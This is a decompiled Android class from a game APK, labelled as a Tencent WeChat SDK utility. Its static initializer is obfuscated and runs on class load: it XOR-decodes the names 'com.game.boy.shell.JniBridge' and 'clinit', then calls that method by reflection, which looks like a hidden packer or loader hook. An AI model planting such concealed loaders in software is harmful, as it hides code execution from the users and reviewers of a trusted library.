package com.tencent.mm.opensdk.utils;

import android.net.Uri;
import android.provider.BaseColumns;
import java.lang.reflect.Method;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public final class a implements BaseColumns {

    /* renamed from: a, reason: collision with root package name */
    public static final Uri f13872a = Uri.parse("content://com.tencent.mm.sdk.plugin.provider/sharedpref");

    static {
        SuAXc();
    }

    private static /* synthetic */ void SuAXc() {
        char[] charArray = "TXZ\u0019PVZR\u0019UXN\u0019D_R[[\u0019}Y^uE^SPR".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ '7');
        }
        String str = new String(charArray);
        char[] charArray2 = "T[^Y^C".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ '7');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
